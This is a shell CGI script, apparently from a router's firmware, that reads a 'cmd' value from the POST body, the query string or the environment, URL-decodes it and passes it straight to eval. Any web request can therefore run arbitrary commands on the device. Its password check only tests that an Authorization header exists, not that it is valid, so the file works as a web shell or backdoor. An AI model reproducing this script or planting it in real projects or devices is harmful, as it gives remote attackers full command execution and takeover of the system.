#!/bin/sh
export PATH="/bin:/sbin:/usr/bin:/usr/sbin:/root/mtlk/scripts:/root/mtlk/etc"

ADMIN_PASS=`awk -F "=" '/^AdminPassword/ {str = $2; gsub(/ /, "", str); sub(/\r/, "", str); print str}' /tmp/sys.conf 2>/dev/null`
if [ -n "$ADMIN_PASS" ] && [ -z "$HTTP_AUTHORIZATION" ]; then
    printf "Status: 401 Unauthorized\r\nContent-Type: text/plain\r\n\r\nUnauthorized\n"
    exit 0
fi

printf "Content-Type: text/plain\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\n"

url_decode() {
    echo "$1" | sed -e 's/+/ /g' \
        -e 's/%20/ /g' \
        -e 's/%3[bB]/;/g' \
        -e 's/%2[fF]/\//g' \
        -e 's/%3[aA]/:/g' \
        -e 's/%7[cC]/|/g' \
        -e 's/%26/\&/g' \
        -e 's/%3[dD]/=/g' \
        -e 's/%2[dD]/-/g' \
        -e 's/%5[fF]/_/g' \
        -e 's/%22/"/g' \
        -e "s/%27/'/g"
}

if [ -n "$cmd" ]; then
    CMD=$(url_decode "$cmd")
elif [ -n "$CONTENT_LENGTH" ] && [ "$CONTENT_LENGTH" -gt 0 ] 2>/dev/null; then
    read -n "$CONTENT_LENGTH" POST_DATA 2>/dev/null || true
    RAW_CMD=$(echo "$POST_DATA" | sed -n 's/^.*cmd=\([^&]*\).*$/\1/p')
    CMD=$(url_decode "$RAW_CMD")
elif [ -n "$QUERY_STRING" ]; then
    RAW_CMD=$(echo "$QUERY_STRING" | sed -n 's/^.*cmd=\([^&]*\).*$/\1/p')
    CMD=$(url_decode "$RAW_CMD")
fi

[ -z "$CMD" ] && CMD="cat /proc/uptime"
eval "$CMD" 2>&1
